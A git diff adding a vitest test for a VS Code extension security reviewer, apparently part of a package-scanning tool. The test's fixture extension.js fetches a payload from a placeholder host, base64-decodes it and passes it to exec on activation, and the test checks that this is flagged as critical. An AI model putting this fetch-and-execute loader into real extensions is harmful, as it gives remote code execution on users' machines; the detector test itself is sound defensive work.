@@ -1,5 +1,6 @@
 import { describe, expect, test } from "vitest";
 import { createPackageDiff } from "../server/lib/review";
+import { readZipArchive } from "../server/lib/tar-parser.js";
 import {
   buildVscodeReleaseManifest,
   createVscodeExtensionReview,
@@ -8,6 +9,7 @@ import {
   vscodeAdapter,
   VSCODE_RULE_IDS,
 } from "../server/lib/adapters/vscode/index";
+import { buildZip } from "./helpers/archive-fixtures.mjs";
 
 const SHA = "ab".repeat(32);
 
@@ -90,6 +92,49 @@ describe("VS Code extension review adapter", () => {
     expect(review.ruleFindings.map((finding) => finding.ruleId)).toEqual(
       expect.arrayContaining([VSCODE_RULE_IDS.broadActivation]),
     );
+  });
+
+  test("reviews real VSIX ZIP bytes through the shared archive parser", async () => {
+    const vsix = buildZip([
+      { path: "[Content_Types].xml", body: '<?xml version="1.0"?><Types/>' },
+      { path: "extension.vsixmanifest", body: '<?xml version="1.0"?><PackageManifest/>' },
+      { path: "extension/package.json", body: extensionPackageJson() },
+      {
+        path: "extension/out/extension.js",
+        body: [
+          "const https = require('https');",
+          "const { exec } = require('child_process');",
+          "function activate() {",
+          "  https.get('https://example.invalid/payload', res => res.on('data', chunk => {",
+          "    const cmd = Buffer.from(String(chunk), 'base64').toString('utf8');",
+          "    exec(cmd);",
+          "  }));",
+          "}",
+        ].join("\n"),
+        deflate: true,
+      },
+    ]);
+    const files = await readZipArchive(vsix.buffer, 2_500, 25 * 1024 * 1024);
+    const manifest = buildVscodeReleaseManifest("example.remote-text-fetcher", "1.0.0", [
+      { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA },
+    ]);
+    const review = createVscodeExtensionReview({
+      manifest,
+      artifact: { path: "dist/remote-text-fetcher-1.0.0.vsix", sha256: SHA, files },
+    });
+
+    expect(review.package).toEqual({ name: "example.remote-text-fetcher", version: "1.0.0" });
+    // Container metadata is stripped; only the extension payload is reviewed.
+    expect(review.fileCount).toBe(2);
+    expect(review.ruleFindings).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: VSCODE_RULE_IDS.startupRemoteCommand,
+          file: "out/extension.js",
+        }),
+      ]),
+    );
+    expect(review.risk).toBe("critical");
   });
 
   test("rejects duplicate normalized VSIX paths before trusting package.json", () => {
